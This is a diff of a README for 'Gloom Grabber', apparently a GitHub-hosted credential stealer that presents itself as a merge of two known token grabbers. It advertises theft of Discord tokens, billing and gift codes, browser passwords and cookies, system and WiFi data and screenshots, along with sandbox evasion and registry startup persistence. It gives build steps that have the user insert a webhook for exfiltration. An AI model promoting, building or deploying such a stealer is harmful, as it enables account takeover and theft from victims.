@@ -1,2 +1,92 @@
-# Gloom-Grabber
-Gloom Grabber is a Token Logger made by merging Hazard Token Grabber V2 and W4SP-Stealer. Credits to the owners of this program.
+</div>
+<hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
+#Gloom Grabber
+Gloob is a Token grabber made by mixing "Hazard Token Grabber V2" and "W4SP-Stealer". All rights to the owners.
+## Features
+- Discord token info
+    - Nitro
+    - Badges 
+    - Billing
+    - Email
+    - Phone
+    - HQ Guilds
+    - HQ Friends
+    - Gift codes
+
+- Browser data
+    - Cookies
+    - Passwords
+    - History
+    - Bookmarks
+    - Autofill
+    - Chrome, Edge, Brave, Opera GX, and many more...
+    - 
+- System info
+    - User
+    - System
+    - Disk
+    - Network
+    - WiFi
+    - Screenshot
+- Anti-debug
+    - Check if being run in a virustotal sandbox
+
+- Startup persistence
+    - Place stub in appdata
+    - Add to startup registry
+
+## Install
+<br>
+<details>
+    <summary>Rquirements</summary>
+    <ul>
+        <li><a href="https://www.python.org/downloads/windows/"><p>Python</p></a></li>
+        <li><a href="https://git-scm.com/download/win"><p>Git</p></a></li>
+    <ul>
+</details>
+<br>
+<details>
+    <summary>For dummies</summary>
+    <ol>
+        <li>Press the green code button and download as zip</li>
+        <li>Extract zip</li>
+        <li>Open GloomGrabber.py and replace the hook function with your hook. It should look like </code>hook = "webhook"</code></li>
+        <li>Run the builder by double clicking the <code>build-exe.bat</code> file</li>
+    </ol>
+</details>
+<br>
+
+```bash
+git clone https://github.com/crxel/Gloom-Grabber/
+cd Gloom-Grabber
+./build-exe.bat
+```
+
+
+
+
+<div align="center">
+    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/bu0.png"></img>
+    <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="75%">    
+    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/em0.png"></img>
+    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/em1.png"></img>
+    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/em2.png"></img>
+    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/em3.png"></img>
+</div>
+
+
+
+## Contributing
+
+View the [contributing guidelines](CONTRIBUTING.md) for more information on how you can help out.
+
+
+
+## License
+
+Empyrean is licensed under the <a href="https://mit-license.org/">MIT License</a>.
+
+
+
+## Errors?
+- Join the [Discord](https://dsc.gg/gloomx)
